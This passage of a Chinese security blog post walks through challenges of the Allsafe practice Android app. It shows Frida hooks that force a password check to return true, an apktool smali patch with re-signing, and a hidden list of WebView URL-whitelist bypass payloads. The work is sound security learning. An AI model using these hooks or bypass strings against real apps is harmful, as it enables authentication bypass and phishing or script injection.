<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">NativeLibrary</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;infosecadventures.allsafe.challenges.NativeLibrary&quot;</span>);</span><br><span class="line">    <span class="title class_">NativeLibrary</span>.<span class="property">checkPassword</span>.<span class="property">implementation</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//frida -U -f infosecadventures.allsafe -l hook_checkPassword.js</span></span><br></pre></td></tr></table></figure>

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224135340940.png" class="" title="image-20241224135340940">



<p>不过还是来看一下怎么Hook so函数。解压APK，在lib目录下有4个目录，这些so文件功能一样，但使用的汇编代码不一样。arm64-v8a目录下是arm64的so文件，armeabi-v7a目录下是arm32的so文件。在不同的平台下，系统会自动选择对应文件夹下的so文件来使用。</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224135857602.png" class="" title="image-20241224135857602">

<p>当前测试环境是arm64，将对应so文件放入ghidra分析很容易找到对应函数为<code>Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword</code>，这也满足JNI静态注册方式的命名规则。</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224151254988.png" class="" title="image-20241224151254988">



<p>另外其实也可以用Frida枚举模块的导出表（在so文件的开发中，一般会有一些导出函数，如JNI静态注册的函数、需要导出给其他so文件使用的函数，以及JNI_OnLoad函数等。这些函数会出现在该so文件的导出表中）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libnative_library.so&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="built_in">exports</span> = <span class="variable language_">module</span>.<span class="title function_">enumerateExports</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> <span class="built_in">exports</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exports</span>[i].<span class="property">type</span> == <span class="string">&quot;function&quot;</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">exports</span>[i]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Java层声明的native方法到了so层会额外增加两个参数，第1个参数是<code>JNIEnv*</code>类型，可以调用里面的很多方法来完成C&#x2F;C++与Java的交互，第2个参数是<code>jclass</code>或<code>jobject</code>，如果native方法是静态方法，这个参数就是jclass，代表native方法所在的类，如果native方法是实例方法，这个参数就是jobject，代表native方法所在的类实例化出来的对象。最终Hook的代码为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libnative_library.so&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> funAddr = <span class="variable language_">module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funAddr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">0</span>]);   <span class="comment">// JNIEnv*</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">1</span>]);   <span class="comment">// jobject</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>]);   <span class="comment">// jstring，JNI中的引用类型，不是直接的C字符串指针，而是Java字符串在JNI层的句柄</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(env.<span class="title function_">getStringUtfChars</span>(args[<span class="number">2</span>]).<span class="title function_">readCString</span>());</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(retval.<span class="title function_">toInt32</span>());</span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//frida -U -l hook_native.js -p $(adb shell pidof infosecadventures.allsafe)</span></span><br></pre></td></tr></table></figure>



<h3 id="Smali-Patch"><a href="#Smali-Patch" class="headerlink" title="Smali Patch"></a>Smali Patch</h3><blockquote>
<p>Allsafe hired a new Android developer who made a beginner mistake setting up the firewall. Can you modify the decompiled Smali code in a way that the firewall is active by default?</p>
</blockquote>
<h4 id="Android架构"><a href="#Android架构" class="headerlink" title="Android架构"></a>Android架构</h4><p>参考 <a target="_blank" rel="noopener" href="https://developer.android.com/guide/platform">https://developer.android.com/guide/platform</a> ，Android基于Linux内核，Android5.0之前运行时是Dalvik，5.0及之后是ART。</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/android-stack.png" class="" title="android-stack">

<p>Java代码编译生成class文件，但class文件中存在很多冗余信息，通过Dex编译器可以将多个class文件优化、打包生成dex文件，即一种专为Android运行时设计的字节码格式，dex文件反汇编之后就是Smali代码（Smali是dex文件中的Dalvik字节码的助记符表示，是一一对应关系）（使用baksmali反汇编一个dex文件后会输出一系列smali文件，每个文件对应dex文件中的一个类），APK本质是个zip压缩包，其中包含AndroidManifest.xml、dex文件、资源文件、应用签名信息等。</p>
<h4 id="使用Apktool进行反编译和重打包"><a href="#使用Apktool进行反编译和重打包" class="headerlink" title="使用Apktool进行反编译和重打包"></a>使用Apktool进行反编译和重打包</h4><p>靶场APK是要求修改smali文件然后重打包使如下if处的条件为true：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224213059960.png" class="" title="image-20241224213059960">



<p>反编译靶场APK：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d allsafe.apk</span><br></pre></td></tr></table></figure>

<p>将102行的INACTIVE改为ACTIVE即可：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224213911935.png" class="" title="image-20241224213911935">



<p>重打包和签名：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alias apksigner=&quot;~/Library/Android/sdk/build-tools/34.0.0/apksigner&quot;</span><br><span class="line">alias zipalign=&quot;~/Library/Android/sdk/build-tools/34.0.0/zipalign&quot;</span><br><span class="line">keytool -genkeypair -alias mykey -keyalg RSA -keysize 2048 -validity 365 -keystore mykeystore.keystore</span><br><span class="line"></span><br><span class="line">apktool b allsafe -o new_allsafe.apk</span><br><span class="line">zipalign 4 new_allsafe.apk new_allsafe_aligned.apk</span><br><span class="line">apksigner sign --ks mykeystore.keystore --ks-key-alias mykey --ks-pass pass:123456 new_allsafe_aligned.apk</span><br></pre></td></tr></table></figure>

<p>安装：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb uninstall infosecadventures.allsafe</span><br><span class="line">adb install new_allsafe_aligned.apk</span><br></pre></td></tr></table></figure>

<p>安装时可能会遇到<code>Failure [INSTALL_FAILED_INVALID_APK: INSTALL_FAILED_INVALID_APK: Failed to extract native libraries, res=-2]</code>，需要修改AndroidManifest.xml文件中<code>android:extractNativeLibs</code>为true然后重新打包。</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224214046580.png" class="" title="image-20241224214046580">



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本来想同时写完几个靶场（<a target="_blank" rel="noopener" href="https://github.com/hax0rgb/InsecureShop">InsecureShop</a>、<a target="_blank" rel="noopener" href="https://github.com/oversecured/ovaa">ovaa</a>、<a target="_blank" rel="noopener" href="https://github.com/DERE-ad2001/Frida-Labs">Frida-Labs</a>），但做完这第一个发现笔记已经很长了，目前对Android应用层漏洞也有了初步理解。此外还学习了HackerOne上大量漏洞案例和 <a target="_blank" rel="noopener" href="https://github.com/WindXaa/Android-Vulnerability-Mining">Android APP漏洞之战系列</a>、<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/article-14155.htm">Android WebView安全攻防指南2020</a> 等文章，很多都从漏洞和组件类型的角度进行了讲解，不过站在攻击者视角，我更倾向从攻击面，攻击方式，最终危害的角度去思考，结合真实漏洞案例，我以自己的理解对Android应用层漏洞做了下梳理和总结：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/whiteboard_exported_image.png" class="" title="whiteboard_exported_image">



<p hidden>
最后再附一下WebView相关漏洞中URL绕过的PoC：
* `evil_whitelist.com`
* `javascript://whitelist.com/%0d%0aalert(1)`
* `https://attack.com\@whitelist.com` （低于Android 8.1，CVE-2017-13274）
* `attack.com://whitelist.com`
* `whitelist.com.evil.com`
* `whitelist.com@evil.com`
* 利用白名单域名URL跳转漏洞
* 条件竞争
</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" rel="tag"># 移动安全</a>
              <a href="/tags/Android/" rel="tag"># Android</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/" rel="prev" title="Apache Solr Backup/Restore APIs RCE (CVE-2023-50386)分析及挖掘思路">
                  <i class="fa fa-angle-left"></i> Apache Solr Backup/Restore APIs RCE (CVE-2023-50386)分析及挖掘思路
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/01/05/%E6%B5%85%E6%9E%90%E5%9F%BA%E4%BA%8E%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%9A%84Android%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" rel="next" title="浅析基于静态分析的Android应用漏洞扫描工具">
                  浅析基于静态分析的Android应用漏洞扫描工具 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">淚笑</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">102k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">6:10</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.1/mermaid.min.js","integrity":"sha256-YbM1pG3wWnzhyYN49g5fPnen+2CKEFaZfopkkwSpNtY="}}</script>
  <script src="/js/third-party/tags/mermaid.js"></script>





  





</body>
</html>
